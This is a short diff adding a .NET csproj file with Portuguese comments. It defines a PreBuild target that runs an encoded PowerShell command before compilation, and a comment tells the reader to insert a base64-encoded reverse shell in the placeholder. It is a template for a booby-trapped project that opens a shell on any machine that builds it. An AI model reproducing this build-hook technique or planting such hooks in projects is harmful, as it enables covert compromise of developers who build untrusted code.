@@ -1,0 +1,17 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+    <PropertyGroup>
+      <OutputType>Exe</OutputType>
+      <!-- verifique qual a versão de compilação do MsBuild para o .NET -->
+      <TargetFramework>net6.0</TargetFramework>
+      <ImplicitUsings>enable</ImplicitUsings>
+      <Nullable>enable</Nullable>
+    </PropertyGroup>
+    
+    <!-- Esta função determina qual será a hora da execução do código -->
+    <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+        <!-- //Coloque sua reverse shell em powershell ou de acordo com o sistema operacional encodada em base64 -->
+        <Exec Command="powershell -e **coloque sua shell aqui**"/> 
+    </Target>
+  
+  </Project>
